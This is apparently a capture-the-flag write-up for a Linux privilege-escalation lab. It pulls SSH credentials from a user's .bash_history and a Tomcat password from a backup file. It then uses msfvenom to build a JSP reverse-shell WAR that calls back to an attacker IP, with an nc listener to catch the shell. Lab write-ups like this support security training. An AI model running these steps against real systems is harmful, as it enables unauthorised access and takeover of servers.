### Submit the contents of flag1.txt

This command will find everything belongs to htb-student

```shell
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
![](Screenshot%202026-08-12%20at%2012.39.35.png)
### Submit the contents of flag2.txt

I gonna enumerate the user named `barry`
![](Screenshot%202026-08-12%20at%2012.40.16.png)![](Screenshot%202026-08-12%20at%2012.40.38.png)

Let's cat the `.bash_history`
![](Screenshot%202026-08-12%20at%2012.42.56.png)

Then I saw `barry`'s ssh credential, tryna login to that user to obtain the `flag2.txt`
![](Screenshot%202026-08-12%20at%2012.51.35.png)
### Submit the contents of flag3.txt

Barry is adm, so he can read all the log files from `/var/log` and run cronjobs
![](Screenshot%202026-08-12%20at%2012.53.03.png)

The `flag3.txt` is in `/var/log`
![](Screenshot%202026-08-12%20at%2012.52.18.png)
### Submit the contents of flag4.txt

I'll perform `linpeas.sh` to gather information for escalating to root user
![](Screenshot%202026-08-12%20at%2013.10.28.png)![](Screenshot%202026-08-12%20at%2013.11.01.png)

```shell
find / -name "*.bak" 2>/dev/null

cat /etc/tomcat9/tomcat-users.xml.bak
```
![](Screenshot%202026-08-12%20at%2013.13.13.png)
![](Screenshot%202026-08-12%20at%2013.14.03.png)

I saw this credential from tomcat bak file `tomcatadm:T0mc@t_s3cret_p@ss!`, lets open the browser and navigate to `http://10.129.235.16:8080/manager/html` use the cred that I obtained to login
![](Screenshot%202026-08-12%20at%2013.18.50.png)

I'll create a rshell.war by using msfvenom and upload on this site to get reverse shell

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.167 LPORT=1234 -f war > rshell.war
```
![](Screenshot%202026-08-12%20at%2013.22.07.png)

Next, I'll initiate the netcat listener to obtain the reverse shell

```shell
nc -lvnp 1234
```
![](Screenshot%202026-08-12%20at%2013.23.28.png)

### Submit the contents of flag5.txt

![](Screenshot%202026-08-12%20at%2013.24.49.png)![](Screenshot%202026-08-12%20at%2013.26.34.png)
![](Screenshot%202026-08-12%20at%2013.28.11.png)